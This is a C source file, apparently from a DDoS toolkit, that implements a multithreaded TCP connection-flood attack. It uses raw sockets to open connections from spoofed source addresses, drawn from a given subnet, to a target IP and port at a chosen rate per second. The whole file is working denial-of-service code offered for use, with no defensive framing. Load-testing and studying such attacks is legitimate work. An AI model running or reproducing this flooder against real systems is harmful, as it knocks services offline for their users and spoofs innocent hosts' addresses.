#include "header.h"
#include "base/make_ipv4.h"
#include "base/make_tcp.h"
#include "base/subnet_mask.h"
#include "base/time_check.h"
#include "ddos/conn_flood.h"

extern int g_num_threads;

// session counting
uint32_t g_conn_num_total;
uint32_t g_conn_num_generated_in_sec;

// from main()
InputArguments g_conn_input;
uint32_t g_conn_request_per_sec;

// for masking next ip address
MaskingArguments g_conn_now;

// thread
pthread_mutex_t g_conn_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_conn_cond = PTHREAD_COND_INITIALIZER;

// time checking
struct timespec g_conn_before_time;
struct timespec g_conn_now_time;

void ConnectionFloodPrintUsage(void)
{
    printf(
            "Connection Flooding Usage : "
            "[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
    return;
}

void *GenerateConnFlood(void *data)
{
    srand(time(NULL));
    int sock = MakeRawSocket(IPPROTO_TCP);
    MaskingArguments conn_now;
    while (1) {
        // *** begin of critical section ***
        pthread_mutex_lock(&g_conn_mutex);

        // get now resource
        GetMaskingArguments(&g_conn_input, &g_conn_now);
        conn_now = g_conn_now;

        // wait a second
        if (g_conn_num_generated_in_sec >= g_conn_request_per_sec) {
            pthread_cond_wait(&g_conn_cond, &g_conn_mutex);
        }

        g_conn_num_generated_in_sec++;
        g_conn_num_total++;
        // *** end of critical section ***
        pthread_mutex_unlock(&g_conn_mutex);

        // make and do tcp connection using raw socket
        int src_port, seq, ack;
        MakeTcpConnection(
                sock,
                inet_addr(conn_now.src),
                inet_addr(conn_now.dest),
                &src_port,
                conn_now.port,
                &seq,
                &ack,
                0);
    }
    close(sock);
    return 0;
}

void *ConnectionFloodTimeCheck(void *data)
{
    while (1) {
        pthread_mutex_lock(&g_conn_mutex);
        TimeCheck(
                &g_conn_cond,
                &g_conn_before_time,
                &g_conn_now_time,
                &g_conn_num_generated_in_sec);
        pthread_mutex_unlock(&g_conn_mutex);
    }
    return NULL;
}

void ConnFloodMain(char *argv[])
{
    int argc = 0;
    srand(time(NULL));
    while (argv[argc] != NULL) {
        argc++;
    }
    if (argc != 4) {
        ConnectionFloodPrintUsage();
        return;
    }
    // parse args
    ArgvToInputArguments(argv, &g_conn_input);
    g_conn_num_generated_in_sec = 0;
    g_conn_num_total = 0;
    // initialize timespecs
    memset(&g_conn_before_time, 0, sizeof(struct timespec));
    memset(&g_conn_now_time, 0, sizeof(struct timespec));
    // parse args
    g_conn_request_per_sec = atoi(argv[3]);
    const int num_threads = g_num_threads;
    pthread_t threads[9999];
    int thread_ids[9999];
    int i;
    for (i = 0; i < num_threads; i++) {
        thread_ids[i] = i;
    }
    printf("Sending Connection Flooding requests to %s using %d threads\n",
            g_conn_input.dest, num_threads);
    for (i = 0; i < num_threads; i++) {
        pthread_create(
                &threads[i],
                NULL,
                GenerateConnFlood,
                (void *)&thread_ids[i]);
    }
    pthread_create(&threads[i], NULL, ConnectionFloodTimeCheck, NULL);
    for (i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
        printf("thread %d joined\n", i);
    }
    pthread_mutex_destroy(&g_conn_mutex);
    printf("Connection Flooding finished\nTotal %u packets sent.\n",
            g_conn_num_total);
    pthread_exit(NULL);
    return;
}
